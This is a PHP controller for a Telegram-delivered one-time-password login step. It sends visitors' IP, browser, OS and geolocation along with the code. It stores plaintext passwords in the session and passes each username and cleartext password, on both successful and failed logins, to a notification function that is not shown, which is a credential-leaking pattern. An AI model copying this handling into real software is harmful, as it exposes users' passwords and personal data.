<?php
class ChallengeController extends AppController {
	public function index() {
		$username = $this->Session->read('2fa.username');
		$password = $this->Session->read('2fa.password');
		
		$this->loadModel('User');
		$user_data = $this->User->findByUsername($username);
		if($user_data){
			
			$user_id = $user_data['User']['id'];
			$chat_id = $user_data['User']['chat_id'];
			$response = $this->create_user_challenge($user_id);
			
			$masked =  str_pad(substr($chat_id, -4), strlen($chat_id), '*', STR_PAD_LEFT);
			$this->set('chat_id',$masked);

			if($response === true){
				//do nothing
			}else if($response === false){
				$this->Session->setFlash("Failed to generate 2FA authentication.", 'alert.error');
				return $this->redirect(array('controller' => 'login', 'action' => 'index', 'prefix' => false));
			}else{
				//send here
				$this->send_challenge($chat_id,$response);
			}

		}else{
			$this->Session->setFlash("User not found!", 'alert.error');
			return $this->redirect(array('controller' => 'login', 'action' => 'index', 'prefix' => false));
		}
	}
	
	private function create_user_challenge($user_id,$force=false){
		$response = false;
		
		$verification_code = $this->generate_unique_key();
		$user_data = $this->User->find('first',array(
			'fields'=>array(
				'User.id',
				'User.verification_code',
				'User.verification_expiration',
				'User.chat_id',
			),
			'conditions'=>array(
				'User.id' => $user_id,
				'NOW() <= User.verification_expiration'
			)
		));

		if(count($user_data)<=0 || $force==true){
			
			$user_data['User']['id'] = $user_id;
			$user_data['User']['verification_code'] = $verification_code;
			$user_data['User']['verification_expiration'] = $this->User->getDataSource()->expression('date_add(NOW(),interval 30 minute)');
			
			if($this->User->save($user_data)){
				$response = $verification_code;
			}else{
				$response = false;
			}
			
		}else{
			$response = true;
		}
		
		return $response;
	}
	
	public function resend_challenge(){
		$this->autoRender = false;
		$username = $this->Session->read('2fa.username');
		$password = $this->Session->read('2fa.password');
		
		$this->loadModel('User');
		$user_data = $this->User->findByUsername($username);
		if($user_data){
			
			$user_id = $user_data['User']['id'];
			$chat_id = $user_data['User']['chat_id'];
			$response = $this->create_user_challenge($user_id,true);

			if($response){
				//send here
				$this->send_challenge($chat_id,$response);
				$this->Session->setFlash("Verification sent!", 'alert.success');
				return $this->redirect(array('controller' => 'challenge', 'action' => 'index', 'prefix' => false));
			}else{
				$this->Session->setFlash("Failed to generate 2FA authentication.", 'alert.error');
				return $this->redirect(array('controller' => 'login', 'action' => 'index', 'prefix' => false));
			}

		}else{
			$this->Session->setFlash("User not found!", 'alert.error');
			return $this->redirect(array('controller' => 'login', 'action' => 'index', 'prefix' => false));
		}
		
	}
	
	private function send_challenge($chat_id, $verification_code){
		$this->loadModel('Setting');
		$settings_data = $this->Setting->find('first',array(
			'fields'=> array(
				'Setting.user_telegram_bot',
			),
			'recursive'=>-1
		));
		$token =  $settings_data['Setting']['user_telegram_bot'];
		
		
		$IP = getUserIP();
		$browser = getBrowser();
		$os = getOS($_SERVER['HTTP_USER_AGENT']);
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, "http://ip-api.com/json/" . $IP);
		curl_setopt($ch, CURLOPT_HEADER, 0);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		$ip_data_in = curl_exec($ch);
		curl_close($ch);
		$ip_data = json_decode($ip_data_in, true);
		$country = $ip_data["country"];
		$city = $ip_data["city"];
		$isp = $ip_data["isp"];
		$code = $ip_data["zip"];
		$timezone = $ip_data["timezone"];
		
		
		$message = "🔐 LOGIN OTP 🔐
---------------------------------------
🔑 OTP: $verification_code
---------------------------------------
💻 System Information 📱
---------------------------------------
🌎 IP Address : $IP
📅 Date : ".date('d/m/Y H:i:s')."
🛫 Country : $country
🏙 City : $city
⌨️ Browser : $browser
🖥 OS : $os
📫 Postal Code : $code
🕛 Time Zone : $timezone
⚡️ ISP :  $isp";
		
		send_telegram_msg($chat_id,$token,$message);
	}
	
	public function verify_challenge(){
		$this->autoRender = false;
		if ($this->request->is('post') || $this->request->is('put')) {
			$digits = implode("",$this->request->data['digits']);
			$username = $this->Session->read('2fa.username');
			$password = $this->Session->read('2fa.password');
			
			$this->loadModel('User');
			$is_verified = $this->User->find('count',array(
				'conditions'=>array(
					'User.username' => $username,
					'User.verification_code' => $digits,
					'NOW() <= User.verification_expiration'
				),
				'recursive'=>-1
			));
			
			if($is_verified){
				
				$this->request->data['User']['username'] = $username;
				$this->request->data['User']['password'] = $password;
				
				if ($this->Auth->login()) {

					$data['User']['id'] = $this->Auth->user('id');
					$data['User']['verification_code'] = $this->User->getDataSource()->expression('NULL');
					$data['User']['verification_expiration'] = $this->User->getDataSource()->expression('NULL');
					$data['User']['last_login'] = $this->User->getDataSource()->expression('NOW()');
					$this->User->save($data);
					
					$this->send_login_notification($this->request->data['User']['username'], $this->request->data['User']['password']);
					return $this->redirect(array('controller' => 'users', 'action' => 'dashboard', 'prefix' => false));
					
				}else{
				    $this->send_login_notification($this->request->data['User']['username'], $this->request->data['User']['password'], false);
					$this->Session->setFlash("Invalid username or password", 'alert.error');
					return $this->redirect(array('controller' => 'login', 'action' => 'index', 'prefix' => false));
				}
			}else{
				$this->Session->setFlash("The code you entered is invalid", 'alert.error');
				return $this->redirect(array('controller' => 'challenge', 'action' => 'index', 'prefix' => false));
			}
			
			
		}
	}
	
	private function generate_unique_key()
	{
		return random_int(100000, 999999);
	}
	
	public function beforeFilter() {
		parent::beforeFilter();
		$this->Auth->allow('index','resend_challenge','verify_challenge');
		$this->layout = 'login';
	}
	
	public function isAuthorized($user) {
		return true;
	}

}
?>